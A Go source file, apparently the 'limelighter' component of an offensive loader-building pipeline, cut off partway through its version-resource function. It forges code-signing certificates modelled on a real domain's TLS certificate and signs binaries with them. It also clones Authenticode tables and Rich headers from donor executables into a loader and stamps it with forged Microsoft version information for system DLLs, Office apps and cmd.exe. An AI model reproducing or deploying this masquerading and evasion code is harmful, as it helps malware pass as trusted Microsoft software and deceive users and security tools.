package limelighter

import (
	"bytes"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/binary"
	"encoding/pem"
	"erlik/pipeline/peutils"
	"fmt"
	"io"
	"log"
	crand "math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/josephspurrier/goversioninfo"
)

const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"

func VarNumberLength(min, max int) string {
	var r string
	crand.Seed(time.Now().UnixNano())
	num := crand.Intn(max-min) + min
	n := num
	r = RandStringBytes(n)
	return r
}
func RandStringBytes(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[crand.Intn(len(letters))]

	}
	return string(b)
}

func GenerateCert(domain string) error {
	var err error
	rootKey, err := rsa.GenerateKey(rand.Reader, 4096)
	if err != nil {
		panic(err)
	}
	certs, err := GetCertificatesPEM(domain + ":443")
	if err != nil {
		return fmt.Errorf("the domain %s does not exist or is not accessible from the host you are compiling on", domain)
	}
	block, _ := pem.Decode([]byte(certs))
	cert, _ := x509.ParseCertificate(block.Bytes)

	keyToFile(domain+".key", rootKey)

	SubjectTemplate := x509.Certificate{
		SerialNumber: cert.SerialNumber,
		Subject: pkix.Name{
			CommonName: cert.Subject.CommonName,
		},
		NotBefore:             cert.NotBefore,
		NotAfter:              cert.NotAfter,
		BasicConstraintsValid: true,
		IsCA:                  true,
		KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageCertSign,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth, x509.ExtKeyUsageClientAuth},
	}
	IssuerTemplate := x509.Certificate{
		SerialNumber: cert.SerialNumber,
		Subject: pkix.Name{
			CommonName: cert.Issuer.CommonName,
		},
		NotBefore: cert.NotBefore,
		NotAfter:  cert.NotAfter,
	}
	derBytes, err := x509.CreateCertificate(rand.Reader, &SubjectTemplate, &IssuerTemplate, &rootKey.PublicKey, rootKey)
	if err != nil {
		panic(err)
	}
	certToFile(domain+".pem", derBytes)
	return nil
}

func keyToFile(filename string, key *rsa.PrivateKey) {
	file, err := os.Create(filename)
	if err != nil {
		panic(err)
	}
	defer file.Close()
	b, err := x509.MarshalPKCS8PrivateKey(key)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Unable to marshal RSA private key: %v", err)
		os.Exit(2)
	}
	if err := pem.Encode(file, &pem.Block{Type: "RSA PRIVATE KEY", Bytes: b}); err != nil {
		panic(err)
	}
}

func certToFile(filename string, derBytes []byte) {
	certOut, err := os.Create(filename)
	if err != nil {
		log.Fatalf("[-] Failed to Open cert.pem for Writing: %s", err)
	}
	if err := pem.Encode(certOut, &pem.Block{Type: "CERTIFICATE", Bytes: derBytes}); err != nil {
		log.Fatalf("[-] Failed to Write Data to cert.pem: %s", err)
	}
	if err := certOut.Close(); err != nil {
		log.Fatalf("[-] Error Closing cert.pem: %s", err)
	}
}

func GetCertificatesPEM(address string) (string, error) {
	conn, err := tls.Dial("tcp", address, &tls.Config{
		InsecureSkipVerify: true,
	})
	if err != nil {
		return "", err
	}
	defer conn.Close()
	var b bytes.Buffer
	for _, cert := range conn.ConnectionState().PeerCertificates {
		err := pem.Encode(&b, &pem.Block{
			Type:  "CERTIFICATE",
			Bytes: cert.Raw,
		})
		if err != nil {
			return "", err
		}
	}
	return b.String(), nil
}

// runCmd runs an external tool and fatals with its output on failure.
func runCmd(tool string, args ...string) {
	cmd := exec.Command(tool, args...)
	if out, err := cmd.CombinedOutput(); err != nil {
		log.Fatalf("%s failed: %s\n%s", tool, err, out)
	}
}

func GeneratePFK(password string, domain string) {
	runCmd("openssl", "pkcs12", "-export", "-out", domain+".pfx", "-inkey", domain+".key", "-in", domain+".pem", "-passin", "pass:"+password, "-passout", "pass:"+password)
}

func SignExecutable(password string, pfx string, filein string, fileout string) {
	runCmd("osslsigncode", "sign", "-pkcs12", pfx, "-in", filein, "-out", fileout, "-pass", password)
}

func Cloner(CompiledLoader, FiletoClone string) {
	Clonefile, err := os.ReadFile(FiletoClone)
	if err != nil {
		log.Fatalf("Error reading file to clone: %s", err)
	}
	LoaderFile, err := os.ReadFile(CompiledLoader)
	if err != nil {
		log.Fatalf("Error reading compiled loader: %s", err)
	}
	certOff, certSize, _, err := certDirEntry(Clonefile)
	if err != nil {
		log.Fatalf("Error parsing PE of clone source: %s", err)
	}
	if certSize == 0 {
		fmt.Println("[*] Clone source has no certificate table, skipping")
		return
	}
	if uint64(certOff)+uint64(certSize) > uint64(len(Clonefile)) {
		log.Fatalf("Error parsing PE of clone source: certificate out of bounds")
	}
	cert := append([]byte(nil), Clonefile[certOff:certOff+certSize]...)

	tgtOff, tgtSize, entryOff, err := certDirEntry(LoaderFile)
	if err != nil {
		log.Fatalf("Error parsing PE of loader: %s", err)
	}
	// Surgical clone: patch the directory entry and append the bytes.
	// The rest of the target stays bit-identical, unlike a full PE
	// rewrite which chokes on small e_lfanew linkers emit.
	out := LoaderFile
	if tgtSize > 0 && uint64(tgtOff)+uint64(tgtSize) == uint64(len(out)) {
		out = out[:tgtOff]
	}
	for len(out)%8 != 0 {
		out = append(out, 0)
	}
	newOff := uint32(len(out))
	out = append(out, cert...)
	binary.LittleEndian.PutUint32(out[entryOff:entryOff+4], newOff)
	binary.LittleEndian.PutUint32(out[entryOff+4:entryOff+8], certSize)
	tmpLoader := CompiledLoader + ".clone"
	if err := os.WriteFile(tmpLoader, out, 0777); err != nil {
		log.Fatalf("Error writing cloned loader: %s", err)
	}
	if err := os.Rename(tmpLoader, CompiledLoader); err != nil {
		os.Remove(tmpLoader)
		log.Fatalf("Error replacing loader with clone: %s", err)
	}
	fmt.Println("[!] WARNING: cloned Authenticode data does NOT produce a valid signature.")
	fmt.Println("[!] The certificate is copied for appearance only; any real validation (e.g. Defender ATP) will flag the hash mismatch.")
}

// findRichBlock locates the Rich header (XOR'd DanS records + "Rich" trailer)
// between the DOS header and the PE signature. Returns byte offsets.
func findRichBlock(data []byte, peOffset int) (int, int, bool) {
	if peOffset < 0x48 || peOffset > len(data)-8 {
		return 0, 0, false
	}
	richEnd := -1
	for i := 0x40; i < peOffset-4; i++ {
		if data[i] == 'R' && data[i+1] == 'i' && data[i+2] == 'c' && data[i+3] == 'h' {
			richEnd = i + 8
			break
		}
	}
	if richEnd < 0 || richEnd > peOffset {
		return 0, 0, false
	}
	checksum := binary.LittleEndian.Uint32(data[richEnd-4 : richEnd])
	for i := 0x40; i+4 <= richEnd-8; i++ {
		if binary.LittleEndian.Uint32(data[i:i+4])^checksum == 0x536E6144 {
			return i, richEnd, true
		}
	}
	return 0, 0, false
}

func peOffsetOf(data []byte) (int, bool) {
	if len(data) < 64 || data[0] != 'M' || data[1] != 'Z' {
		return 0, false
	}
	peOff := int(binary.LittleEndian.Uint32(data[0x3C:0x40]))
	if peOff < 0 || peOff+24 > len(data) || data[peOff] != 'P' || data[peOff+1] != 'E' {
		return 0, false
	}
	return peOff, true
}

func CloneRichHeader(donorPath, targetPath string) {
	donor, err := os.ReadFile(donorPath)
	if err != nil {
		log.Fatalf("CloneRichHeader: error reading donor %s: %s", donorPath, err)
	}
	target, err := os.ReadFile(targetPath)
	if err != nil {
		log.Fatalf("CloneRichHeader: error reading target %s: %s", targetPath, err)
	}

	donorPE, ok := peOffsetOf(donor)
	if !ok {
		fmt.Println("[!] CloneRichHeader: donor is not a valid PE, skipping")
		return
	}
	donorStart, donorEnd, ok := findRichBlock(donor, donorPE)
	if !ok {
		fmt.Println("[!] CloneRichHeader: no Rich header found in donor, skipping")
		return
	}
	donorRich := append([]byte(nil), donor[donorStart:donorEnd]...)

	targetPE, ok := peOffsetOf(target)
	if !ok {
		fmt.Println("[!] CloneRichHeader: target is not a valid PE, skipping")
		return
	}

	// If the target already has a Rich slot big enough, replace in place.
	if tStart, tEnd, ok := findRichBlock(target, targetPE); ok && tEnd-tStart >= len(donorRich) {
		copy(target[tStart:], donorRich)
		for i := tStart + len(donorRich); i < tEnd; i++ {
			target[i] = 0
		}
		peutils.FixPEChecksum(target, targetPE)
		if err := os.WriteFile(targetPath, target, 0777); err != nil {
			log.Fatalf("CloneRichHeader: error writing %s: %s", targetPath, err)
		}
		fmt.Println("[+] Rich header cloned from donor PE")
		return
	}

	// Otherwise expand the headers: keep DOS header+stub, insert the donor
	// Rich block, then move the PE headers after it. Section bytes stay at
	// the same file offsets, so only e_lfanew (and maybe SizeOfHeaders)
	// needs updating. Go (e_lfanew 0x80) and LLD (0x78) targets emit no
	// Rich header, so this path is the normal one for them.
	numSections := int(binary.LittleEndian.Uint16(target[targetPE+6 : targetPE+8]))
	sizeOfOpt := int(binary.LittleEndian.Uint16(target[targetPE+20 : targetPE+22]))
	headersEnd := targetPE + 4 + 20 + sizeOfOpt + 40*numSections
	if headersEnd > len(target) {
		fmt.Println("[!] CloneRichHeader: target headers out of bounds, skipping")
		return
	}
	firstRaw := len(target)
	sectionTable := targetPE + 4 + 20 + sizeOfOpt
	for i := 0; i < numSections; i++ {
		rawPtr := int(binary.LittleEndian.Uint32(target[sectionTable+i*40+20 : sectionTable+i*40+24]))
		if rawPtr > 0 && rawPtr < firstRaw {
			firstRaw = rawPtr
		}
	}

	keepEnd := targetPE
	if tStart, _, ok := findRichBlock(target, targetPE); ok {
		keepEnd = tStart
	}
	newPE := (keepEnd + len(donorRich) + 7) &^ 7
	headersLen := headersEnd - targetPE
	if newPE+headersLen > firstRaw {
		fmt.Printf("[!] CloneRichHeader: need %d header bytes, only %d free before section data, skipping\n", newPE+headersLen-keepEnd, firstRaw-keepEnd)
		return
	}

	out := append([]byte(nil), target...)
	for i := keepEnd; i < newPE+headersLen; i++ {
		out[i] = 0
	}
	copy(out[keepEnd:], donorRich)
	copy(out[newPE:], target[targetPE:headersEnd])
	binary.LittleEndian.PutUint32(out[0x3C:0x40], uint32(newPE))

	// Grow SizeOfHeaders if the moved headers no longer fit inside it.
	optOff := newPE + 24
	optMagic := binary.LittleEndian.Uint16(out[optOff : optOff+2])
	var fileAlignOff, sizeHdrOff int
	if optMagic == 0x20b {
		fileAlignOff, sizeHdrOff = optOff+32, optOff+60
	} else if optMagic == 0x10b {
		fileAlignOff, sizeHdrOff = optOff+28, optOff+56
	}
	if sizeHdrOff > 0 && sizeHdrOff+4 <= len(out) {
		sizeHdr := int(binary.LittleEndian.Uint32(out[sizeHdrOff : sizeHdrOff+4]))
		if newPE+headersLen > sizeHdr {
			fileAlign := int(binary.LittleEndian.Uint32(out[fileAlignOff : fileAlignOff+4]))
			if fileAlign <= 0 {
				fileAlign = 0x200
			}
			grown := (newPE + headersLen + fileAlign - 1) &^ (fileAlign - 1)
			if grown <= firstRaw {
				binary.LittleEndian.PutUint32(out[sizeHdrOff:sizeHdrOff+4], uint32(grown))
			}
		}
	}

	peutils.FixPEChecksum(out, newPE)
	if err := os.WriteFile(targetPath, out, 0777); err != nil {
		log.Fatalf("CloneRichHeader: error writing %s: %s", targetPath, err)
	}
	fmt.Println("[+] Rich header cloned from donor PE")
}

func RandomFileProperties(name string) string {
	fmt.Println("[*] Generating random version information")
	vi := &goversioninfo.VersionInfo{}

	companies := []string{
		"Contoso Ltd.", "Fabrikam Inc.", "Northwind Traders",
		"Adventure Works", "Trey Research", "Tailspin Toys",
		"Woodgrove Bank", "Proseware Inc.", "Lucerne Publishing",
		"Consolidated Messenger", "Fourth Coffee", "Graphic Design Institute",
		"Litware Inc.", "Margie's Travel", "Blue Yonder Airlines",
	}
	descriptions := []string{
		"System Configuration Utility", "Network Management Service",
		"Data Processing Module", "Security Compliance Manager",
		"Performance Monitor Service", "Application Runtime Library",
		"Resource Management DLL", "Communication Protocol Handler",
		"Storage Management Utility", "Device Configuration Service",
		"Update Management Component", "System Maintenance Tool",
		"Background Service Host", "Configuration Manager Library",
		"Platform Integration Module",
	}

	crand.Seed(time.Now().UnixNano())
	company := companies[crand.Intn(len(companies))]
	description := descriptions[crand.Intn(len(descriptions))]
	majorVer := 1 + crand.Intn(21)
	minorVer := crand.Intn(10)
	patchVer := crand.Intn(50000)
	buildVer := crand.Intn(50000)
	year := 2019 + crand.Intn(7)

	verStr := fmt.Sprintf("%d.%d.%d.%d", majorVer, minorVer, patchVer, buildVer)

	vi.StringFileInfo.CompanyName = company
	vi.StringFileInfo.FileDescription = description
	vi.StringFileInfo.FileVersion = verStr
	vi.StringFileInfo.LegalCopyright = fmt.Sprintf("Copyright (C) %d %s", year, company)
	vi.StringFileInfo.OriginalFilename = name
	vi.StringFileInfo.ProductName = description
	vi.StringFileInfo.ProductVersion = verStr
	vi.StringFileInfo.InternalName = name
	vi.FixedFileInfo.FileVersion.Major = majorVer
	vi.FixedFileInfo.FileVersion.Minor = minorVer
	vi.FixedFileInfo.FileVersion.Patch = patchVer
	vi.FixedFileInfo.FileVersion.Build = buildVer
	vi.FixedFileInfo.ProductVersion.Major = majorVer
	vi.FixedFileInfo.ProductVersion.Minor = minorVer
	vi.FixedFileInfo.ProductVersion.Patch = patchVer
	vi.FixedFileInfo.ProductVersion.Build = buildVer

	vi.Build()
	vi.Walk()

	fileout := "fart.syso"
	if err := vi.WriteSyso(fileout, "amd64"); err != nil {
		log.Printf("Error writing syso: %v", err)
		os.Exit(3)
	}
	fmt.Println("[+] Created Random Version Info Resource")
	return name
}

// jitterDefaultVersion applies always-on minor jitter to the DEFAULT
// (built-in spoof) version resource: small random offsets on Patch/Build
// numbers only. Major/Minor and all name strings stay intact. Never call
// on the explicit -configfile path, which must stay byte-stable.
func jitterDefaultVersion(vi *goversioninfo.VersionInfo) {
	crand.Seed(time.Now().UnixNano())
	vi.FixedFileInfo.FileVersion = jitterFixed(vi.FixedFileInfo.FileVersion)
	vi.FixedFileInfo.ProductVersion = jitterFixed(vi.FixedFileInfo.ProductVersion)
	vi.StringFileInfo.FileVersion = jitterString(vi.StringFileInfo.FileVersion)
	vi.StringFileInfo.ProductVersion = jitterString(vi.StringFileInfo.ProductVersion)
}

func jitterFixed(v goversioninfo.FileVersion) goversioninfo.FileVersion {
	if v.IsZero() {
		return v
	}
	v.Patch += crand.Intn(8)
	v.Build += crand.Intn(64)
	return v
}

// jitterString shifts the 3rd/4th dotted numbers, preserving any suffix
// such as " (WinBuild.160101.0800)". Unparseable input passes through.
func jitterString(s string) string {
	num, suffix, _ := strings.Cut(s, " ")
	parts := strings.Split(num, ".")
	if len(parts) != 4 {
		return s
	}
	var n [4]int
	for i, p := range parts {
		v, err := strconv.Atoi(p)
		if err != nil {
			return s
		}
		n[i] = v
	}
	n[2] += crand.Intn(8)
	n[3] += crand.Intn(64)
	out := fmt.Sprintf("%d.%d.%d.%d", n[0], n[1], n[2], n[3])
	if suffix != "" {
		out += " " + suffix
	}
	return out
}

func FileProperties(name string, configFile string) string {
	fmt.Println("[*] Creating an Embedded Resource File")
	vi := &goversioninfo.VersionInfo{}
	if configFile != "" {
		var err error
		input := io.ReadCloser(os.Stdin)
		cfgPath := configFile
		if !filepath.IsAbs(cfgPath) {
			cfgPath = "../" + cfgPath
		}
		if input, err = os.Open(cfgPath); err != nil {
			log.Printf("Cannot open %q: %v", configFile, err)
			os.Exit(3)
		}
		jsonBytes, err := io.ReadAll(input)
		input.Close()
		if err != nil {
			log.Printf("Error reading %q: %v", configFile, err)
			os.Exit(3)
		}
		if err := vi.ParseJSON(jsonBytes); err != nil {
			log.Printf("Could not parse the .json file: %v", err)
			os.Exit(3)
		}
		name = vi.StringFileInfo.InternalName
	} else if configFile == "" {
		if name == "APMon" {
			vi.StringFileInfo.InternalName = "APMon.dll.mui"
			vi.StringFileInfo.FileDescription = "Adaptive Port Monitor"
			vi.StringFileInfo.FileVersion = "10.0.19041.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "C:\\Windows\\System32\\APMon.dll"
			vi.FixedFileInfo.ProductVersion.Patch = 19041
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft Corporation"
			vi.StringFileInfo.ProductVersion = "10.0.19041.1"
			vi.FixedFileInfo.FileVersion.Major = 1
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 19041
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "APMon.dll.mui"
		}
		if name == "bisr" {
			vi.StringFileInfo.InternalName = "bisrv.dll.mui"
			vi.StringFileInfo.FileDescription = "Background Tasks Infrastructure Service"
			vi.StringFileInfo.FileVersion = "10.0.19041.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "C:\\Windows\\System32\\bisrv.dll"
			vi.FixedFileInfo.ProductVersion.Patch = 19041
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft Corporation"
			vi.StringFileInfo.ProductVersion = "10.0.19041.1"
			vi.FixedFileInfo.FileVersion.Major = 1
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 19041
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "bisrv.dll.mui"
		}
		if name == "btpanui" {
			vi.StringFileInfo.InternalName = "btpanui.dll.mui"
			vi.StringFileInfo.FileDescription = "Bluetooth PAN User Interface"
			vi.StringFileInfo.FileVersion = "10.0.19041.1 (WinBuild.160101.0800"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "C:\\Windows\\System32\\btpanui.dll"
			vi.FixedFileInfo.ProductVersion.Patch = 19041
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft Corporation"
			vi.StringFileInfo.ProductVersion = "10.0.19041.1"
			vi.FixedFileInfo.FileVersion.Major = 1
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 19041
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "btpanui.dll.mui"
		}
		if name == "certcli" {
			vi.StringFileInfo.InternalName = "CertCli"
			vi.StringFileInfo.FileDescription = "Microsoft® Active Directory Certificate Services Client"
			vi.StringFileInfo.FileVersion = "10.0.19041.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "C:\\Windows\\System32\\certcli.dll"
			vi.FixedFileInfo.ProductVersion.Patch = 19041
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft Corporation"
			vi.StringFileInfo.ProductVersion = "10.0.19041.1"
			vi.FixedFileInfo.FileVersion.Major = 1
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 19041
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "CertCli"
		}
		if name == "cmdext" {
			vi.StringFileInfo.InternalName = "CmdExt.DLL"
			vi.StringFileInfo.FileDescription = "cmd.exe Extension DLL"
			vi.StringFileInfo.FileVersion = "10.0.19041.1023 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "C:\\Windows\\System32\\cmdext.dll"
			vi.FixedFileInfo.ProductVersion.Patch = 19041
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft Corporation"
			vi.StringFileInfo.ProductVersion = "10.0.19041.1023"
			vi.FixedFileInfo.FileVersion.Major = 1
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 19041
			vi.FixedFileInfo.FileVersion.Build = 1023
			vi.StringFileInfo.InternalName = "CmdExt.DLL"
		}
		if name == "httpapi" {
			vi.StringFileInfo.InternalName = "httpapi.dll.mui"
			vi.StringFileInfo.FileDescription = "HTTP Protocol Stack API"
			vi.StringFileInfo.FileVersion = "10.0.19041.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "C:\\Windows\\System32\\httpapi.dll"
			vi.FixedFileInfo.ProductVersion.Patch = 19041
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft Corporation"
			vi.StringFileInfo.ProductVersion = "10.0.19041.1"
			vi.FixedFileInfo.FileVersion.Major = 1
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 19041
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "httpapi.dll.mui"
		}
		if name == "logoncli" {
			vi.StringFileInfo.InternalName = "LOGONCLI.DLL"
			vi.StringFileInfo.FileDescription = "Net Logon Client DLL"
			vi.StringFileInfo.FileVersion = "10.0.18362.1237 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "C:\\Windows\\System32\\logoncli.dll"
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft Corporation"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1237"
			vi.FixedFileInfo.FileVersion.Major = 1
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1237
			vi.StringFileInfo.InternalName = "LOGONCLI.DLL"
		}
		if name == "netlogon" {
			vi.StringFileInfo.InternalName = "NetLogon.DLL.MUI"
			vi.StringFileInfo.FileDescription = "Net Logon Services DLL"
			vi.StringFileInfo.FileVersion = "10.0.19041.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "C:\\Windows\\System32\\netlogon.dll"
			vi.FixedFileInfo.ProductVersion.Patch = 19041
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft Corporation"
			vi.StringFileInfo.ProductVersion = "10.0.19041.1"
			vi.FixedFileInfo.FileVersion.Major = 1
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 19041
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "NetLogon.DLL.MUI"
		}
		if name == "tcpmon" {
			vi.StringFileInfo.InternalName = "tcpmon.dll.mui"
			vi.StringFileInfo.FileDescription = "Standard TCP/IP Port Monitor DLL"
			vi.StringFileInfo.FileVersion = "10.0.19041.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "C:\\Windows\\System32\\tcpmon.dll"
			vi.FixedFileInfo.ProductVersion.Patch = 19041
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft Corporation"
			vi.StringFileInfo.ProductVersion = "10.0.19041.1"
			vi.FixedFileInfo.FileVersion.Major = 1
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 19041
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "tcpmon.dll.mui"
		}
		if name == "OneNote" {
			vi.IconPath = "onenote.ico"
			vi.StringFileInfo.InternalName = "OneNote"
			vi.StringFileInfo.FileDescription = "Microsoft OneNote"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.FileVersion = "16.0.14326.20404"
			vi.StringFileInfo.OriginalFilename = "OneNote.exe"
			vi.StringFileInfo.ProductName = "Microsoft OneNote"
			vi.StringFileInfo.ProductVersion = "16.0.14326.20404"
			vi.FixedFileInfo.FileVersion.Major = 16
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 14326
			vi.FixedFileInfo.FileVersion.Build = 20404
			vi.StringFileInfo.InternalName = "OneNote"
		}
		if name == "Excel" {
			vi.IconPath = "excel.ico"
			vi.StringFileInfo.InternalName = "Excel"
			vi.StringFileInfo.FileDescription = "Microsoft Excel"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.FileVersion = "16.0.14326.20404"
			vi.StringFileInfo.OriginalFilename = "Excel.exe"
			vi.StringFileInfo.ProductName = "Microsoft Office"
			vi.StringFileInfo.ProductVersion = "16.0.14326.20404"
			vi.FixedFileInfo.FileVersion.Major = 16
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 14326
			vi.FixedFileInfo.FileVersion.Build = 20838
			vi.StringFileInfo.InternalName = "Excel"
		}
		if name == "Word" {
			vi.IconPath = "word.ico"
			vi.StringFileInfo.InternalName = "Word"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.FileVersion = "16.0.14326.20404"
			vi.StringFileInfo.OriginalFilename = "Word.exe"
			vi.StringFileInfo.ProductName = "Microsoft Office"
			vi.StringFileInfo.ProductVersion = "16.0.14326.20404"
			vi.FixedFileInfo.FileVersion.Major = 16
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 14326
			vi.FixedFileInfo.FileVersion.Build = 20404
			vi.StringFileInfo.InternalName = "Word"
		}
		if name == "Powerpnt" {
			vi.IconPath = "powerpoint.ico"
			vi.StringFileInfo.FileDescription = "Microsoft PowerPoint"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.FileVersion = "16.0.14326.20404"
			vi.StringFileInfo.OriginalFilename = "Powerpnt.exe"
			vi.StringFileInfo.ProductName = "Microsoft Office"
			vi.StringFileInfo.ProductVersion = "16.0.14326.20404"
			vi.FixedFileInfo.FileVersion.Major = 16
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 14326
			vi.FixedFileInfo.FileVersion.Build = 20404
			vi.StringFileInfo.InternalName = "Powerpnt"
		}
		if name == "Outlook" {
			vi.IconPath = "outlook.ico"
			vi.StringFileInfo.InternalName = "Outlook.exe"
			vi.StringFileInfo.FileDescription = "Microsoft Outlook"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.FileVersion = "16.0.14326.20404"
			vi.StringFileInfo.OriginalFilename = "Outlook.exe"
			vi.StringFileInfo.ProductName = "Microsoft Office"
			vi.StringFileInfo.ProductVersion = "16.0.14326.20404"
			vi.FixedFileInfo.FileVersion.Major = 16
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 14326
			vi.FixedFileInfo.FileVersion.Build = 20404
			vi.FixedFileInfo.ProductVersion.Patch = 14326
			vi.FixedFileInfo.ProductVersion.Major = 16
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.InternalName = "Outlook.exe"
		}
		if name == "lync" {
			vi.IconPath = "lync.ico"
			vi.StringFileInfo.InternalName = "Lync"
			vi.StringFileInfo.FileDescription = "Skype for Business"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.FileVersion = "16.0.14326.20404"
			vi.StringFileInfo.OriginalFilename = "Lync.exe"
			vi.StringFileInfo.ProductName = "Microsoft Office"
			vi.StringFileInfo.ProductVersion = "16.0.14326.20404"
			vi.FixedFileInfo.FileVersion.Major = 16
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 14326
			vi.FixedFileInfo.FileVersion.Build = 20404
			vi.StringFileInfo.InternalName = "Lync"
		}
		if name == "cmd" {
			vi.IconPath = "cmd.ico"
			vi.StringFileInfo.InternalName = "Cmd.exe"
			vi.StringFileInfo.FileDescription = "Windows Command Processor"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.FileVersion = "10.0.19041.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.OriginalFilename = "Cmd.exe"
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.19041.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 1
			vi.FixedFileInfo.FileVersion.Build = 19041
			vi.StringFileInfo.InternalName = "Cmd.exe"
		}
		if name == "OneDrive" {
			vi.IconPath = "onedrive.ico"
			vi.StringFileInfo.InternalName = "OneDrive.exe"
			vi.StringFileInfo.FileDescription = "Microsoft OneDrive"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.FileVersion = "21.170.0822.0002"
			vi.StringFileInfo.OriginalFilename = "OneDrive.exe"
